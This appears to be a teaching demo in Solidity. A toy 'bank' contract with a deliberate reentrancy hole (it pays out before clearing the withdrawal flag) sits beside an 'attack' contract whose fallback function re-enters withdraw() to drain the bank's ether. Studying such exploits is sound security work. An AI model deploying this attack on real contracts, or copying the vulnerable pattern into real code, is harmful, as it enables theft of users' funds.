pragma solidity >=0.4.22 <0.6;

contract bank {
    mapping(address=>bool) public isWithDraw;
    event Funding(address _addr, uint _val);
    constructor() public {

    }
    //qian bao da qian
    function() public payable {
        emit Funding(msg.sender, msg.value);
        if(msg.value >= 1 ether) {
            isWithDraw[msg.sender] = true;
        }
    }

    function withdraw() payable public {
        address who = msg.sender;
        require( isWithDraw[who] );
        require( getBalance() > 1 ether );
        who.call.value(1 ether)();
        isWithDraw[who] = false;
    }
    function getBalance() view public returns(uint) {
        return address(this).balance;
    }

}


contract attack {

    bank bk;
    constructor() public {

    }
    function callFunding(address addr) public payable {
        addr.call.value(1 ether)();
        bk = bank(addr);//a bank instance ，web3= addr + abi =>instance
    }
    function() payable public {
        bk.withdraw();
    }

    function getBalance() view public returns(uint) {
        return address(this).balance;
    }
    function withdraw() public payable returns(uint) {
        msg.sender.send(getBalance());
    }

}
